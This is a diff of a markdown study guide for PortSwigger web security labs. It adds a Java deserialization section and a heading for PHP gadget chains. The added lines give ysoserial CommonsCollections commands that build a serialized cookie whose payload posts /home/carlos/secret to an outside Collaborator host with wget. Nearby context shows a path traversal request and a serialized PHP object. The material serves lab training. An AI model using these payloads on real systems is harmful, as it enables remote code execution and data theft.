@@ -1654,6 +1654,8 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
   
 ## Deserialization  
 
+### CustomTemplate PHP  
+
 >Reading page source code and noticing comment mentioning **<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->**, this ***identify*** possible PHP framework and the Burp scannner identify serialized session cookie object after we logged in with stolen ```wiener:peter``` credentials.  
 
 ![info-disclose](images/info-disclose.png)  
@@ -1685,6 +1687,28 @@ O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
 ```  
 
 [PortSwigger Lab: Exploiting PHP deserialization with a pre-built gadget chain](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain)  
+  
+### YsoSerial  
+
+>Intercept the admin panel page reuqest and identify the cookie named **admin-prefs**.  
+
+![Admin prefs serial cookie](images/admin-prefs-serial-cookie.png)  
+
+>Use below payload in the Deserialization scanner exploiting java jar ysoserial command, to obtain remote code execution (RCE) when payload deserialized on target.  
+ 
+```
+CommonsCollections3 'wget http://Collaborator.net --post-file=/home/carlos/secret'
+```  
+
+![ysoserial-rce](images/ysoserial-rce.png)  
+
+>Below is ysoserial command line execution to generate base64 encoded serialized cookie object containing payload.  
+
+```bash
+java -jar /opt/ysoserial/ysoserial.jar CommonsCollections4 'wget http://Collaborator.net --post-file=/home/carlos/secret' | base64
+```  
+
+[PortSwigger Lab: Exploiting Java deserialization with Apache Commons](https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons)  
   
 # Appendix  
 
